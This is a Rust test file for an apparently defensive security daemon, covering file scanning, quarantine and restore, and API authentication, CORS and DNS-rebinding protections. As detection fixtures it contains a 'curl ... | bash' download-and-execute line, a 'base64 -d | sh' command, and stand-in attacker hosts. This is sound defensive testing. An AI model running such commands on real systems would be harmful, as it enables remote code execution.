use axum::{
    body::Body,
    http::{header, Method, Request, StatusCode},
};
use http_body_util::BodyExt;
use kernlock_core::{analyze_command, PolicyConfig, RuleEngine, SecurityMode};
use kernlock_daemon::{api, auth, engine::KernLockEngine};
use kernlock_platform::default_provider;
use kernlock_quarantine::QuarantineManager;
use kernlock_storage::Storage;
use std::fs;
use tempfile::TempDir;
use tower::ServiceExt;

#[test]
fn end_to_end_scan_quarantine_restore_and_storage_workflow() {
    let tmp = TempDir::new().unwrap();
    let db_path = tmp.path().join("kernlock.db");
    let vault_dir = tmp.path().join("quarantine");
    let scan_dir = tmp.path().join("inbox");
    fs::create_dir_all(&scan_dir).unwrap();

    let fixture_path = scan_dir.join("suspicious_installer.sh");
    fs::write(
        &fixture_path,
        b"#!/bin/bash\n# Harmless test fixture\ncurl -fsSL https://example.invalid/payload.sh | bash\n",
    )
    .unwrap();

    let storage = Storage::open(&db_path).unwrap();
    let quarantine = QuarantineManager::new(&vault_dir, storage.clone()).unwrap();
    let rules = RuleEngine::builtin();
    let policy = PolicyConfig::default();
    let provider = default_provider();

    let caps = provider.probe_capabilities(SecurityMode::Protection);
    assert!(!caps.os.is_empty());
    assert!(!caps.kernel_blocking_available);

    let results = provider.scan_path(&scan_dir, &rules, &policy).unwrap();
    assert_eq!(results.len(), 1);
    assert!(results[0].is_suspicious);
    assert!(results[0].risk_score >= 85);

    let rec = quarantine
        .quarantine_file(&fixture_path, &results[0].summary)
        .unwrap();
    assert!(!fixture_path.exists());
    assert_eq!(quarantine.list().unwrap().len(), 1);

    let restored = quarantine.restore_file(rec.id).unwrap();
    assert!(fixture_path.exists());
    assert_eq!(restored.status, kernlock_core::QuarantineStatus::Restored);

    let cmd_res = analyze_command("echo test | base64 -d | sh", &rules);
    assert!(cmd_res.is_suspicious);
}

#[tokio::test]
async fn api_rejects_unauthenticated_and_cross_origin_requests() {
    let tmp = TempDir::new().unwrap();
    let engine = KernLockEngine::init(tmp.path()).unwrap();
    let token = auth::load_or_create_token(tmp.path()).unwrap();
    assert!(token.len() >= 32);

    let app = api::build_router(engine, token.clone(), None);

    // 1. /api/health is accessible without token
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/health")
                .header(header::HOST, "127.0.0.1:17420")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    // 2. Unauthenticated requests to sensitive endpoints must be rejected with 401
    for (method, uri) in [
        (Method::GET, "/api/status"),
        (Method::GET, "/api/quarantine"),
        (Method::POST, "/api/quarantine"),
        (
            Method::POST,
            "/api/quarantine/00000000-0000-0000-0000-000000000000/restore",
        ),
        (
            Method::DELETE,
            "/api/quarantine/00000000-0000-0000-0000-000000000000",
        ),
        (Method::PUT, "/api/policy"),
    ] {
        let resp = app
            .clone()
            .oneshot(
                Request::builder()
                    .method(method)
                    .uri(uri)
                    .header(header::HOST, "127.0.0.1:17420")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "Expected 401 for {}",
            uri
        );
    }

    // 3. Wrong Bearer token must be rejected with 401
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/status")
                .header(header::HOST, "127.0.0.1:17420")
                .header(header::AUTHORIZATION, "Bearer wrong-token")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);

    // 4. Unauthorized cross-origin request must be rejected with 403 and no ACAO header
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/status")
                .header(header::HOST, "127.0.0.1:17420")
                .header(header::ORIGIN, "https://evil.example")
                .header(header::AUTHORIZATION, format!("Bearer {}", token))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    assert!(resp
        .headers()
        .get(header::ACCESS_CONTROL_ALLOW_ORIGIN)
        .is_none());

    // 5. Non-loopback Host header (DNS rebinding attempt) must be rejected with 403
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/status")
                .header(header::HOST, "attacker.example:17420")
                .header(header::AUTHORIZATION, format!("Bearer {}", token))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);

    // 6. Authorized request with valid Host, Origin, and Bearer token succeeds
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/status")
                .header(header::HOST, "127.0.0.1:17420")
                .header(header::ORIGIN, "http://localhost:1420")
                .header(header::AUTHORIZATION, format!("Bearer {}", token))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    assert_eq!(
        resp.headers()
            .get(header::ACCESS_CONTROL_ALLOW_ORIGIN)
            .and_then(|v| v.to_str().ok()),
        Some("http://localhost:1420")
    );
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let json: serde_json::Value = serde_json::from_slice(&body).unwrap();
    assert_eq!(json["capabilities"]["kernel_blocking_available"], false);
}

#[cfg(unix)]
#[test]
fn auth_token_is_created_with_0600_and_rejects_symlinks_or_permissive_modes() {
    use std::os::unix::fs::{symlink, PermissionsExt};

    let tmp = TempDir::new().unwrap();
    let token = kernlock_daemon::auth::load_or_create_token(tmp.path()).unwrap();
    assert!(token.len() >= 32);

    let token_path = kernlock_core::paths::auth_token_path(tmp.path());
    let mode = std::fs::metadata(&token_path).unwrap().permissions().mode() & 0o777;
    assert_eq!(
        mode, 0o600,
        "auth.token must be created with 0600 permissions"
    );

    // Permissive mode (0644) must be rejected on subsequent load
    std::fs::set_permissions(&token_path, std::fs::Permissions::from_mode(0o644)).unwrap();
    assert!(kernlock_daemon::auth::load_or_create_token(tmp.path()).is_err());

    // Symlinked token file must be rejected
    std::fs::remove_file(&token_path).unwrap();
    let other = tmp.path().join("other.token");
    std::fs::write(&other, "0123456789abcdef0123456789abcdef").unwrap();
    std::fs::set_permissions(&other, std::fs::Permissions::from_mode(0o600)).unwrap();
    symlink(&other, &token_path).unwrap();
    assert!(kernlock_daemon::auth::load_or_create_token(tmp.path()).is_err());
}

#[tokio::test]
async fn probe_rejects_unrelated_service_even_if_spoofing_health() {
    use kernlock_core::paths::{probe_authenticated_daemon, DaemonProbeResult};
    use std::io::{Read, Write};
    use std::net::TcpListener;

    // 1. Bind an unrelated listener that spoofs /api/health
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let handle = std::thread::spawn(move || {
        if let Ok((mut stream, _)) = listener.accept() {
            let mut buf = [0u8; 1024];
            let _ = stream.read(&mut buf);
            let req = String::from_utf8_lossy(&buf);
            let resp = if req.starts_with("GET /api/health") {
                "HTTP/1.1 200 OK\r\nContent-Length: 37\r\n\r\n{\"service\":\"kernlockd\",\"status\":\"ok\"}"
            } else {
                "HTTP/1.1 404 Not Found\r\nContent-Length: 9\r\n\r\nnot found"
            };
            let _ = stream.write_all(resp.as_bytes());
        }
    });

    let token = "0123456789abcdef0123456789abcdef";
    let res = probe_authenticated_daemon(port, Some(token));
    assert!(
        matches!(res, DaemonProbeResult::OccupiedByOtherService { .. }),
        "Spoofed/unrelated service must be reported as OccupiedByOtherService, got {res:?}"
    );
    let _ = handle.join();

    // 2. Real kernlockd router on an ephemeral port must return AuthenticatedKernLock
    let tmp = TempDir::new().unwrap();
    let engine = KernLockEngine::init(tmp.path()).unwrap();
    let app = kernlock_daemon::api::build_router(engine, token.to_string(), None);
    let tokio_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let real_port = tokio_listener.local_addr().unwrap().port();
    let server = tokio::spawn(async move {
        let _ = axum::serve(tokio_listener, app).await;
    });

    let real_res =
        tokio::task::spawn_blocking(move || probe_authenticated_daemon(real_port, Some(token)))
            .await
            .unwrap();
    assert_eq!(real_res, DaemonProbeResult::AuthenticatedKernLock);
    server.abort();
}
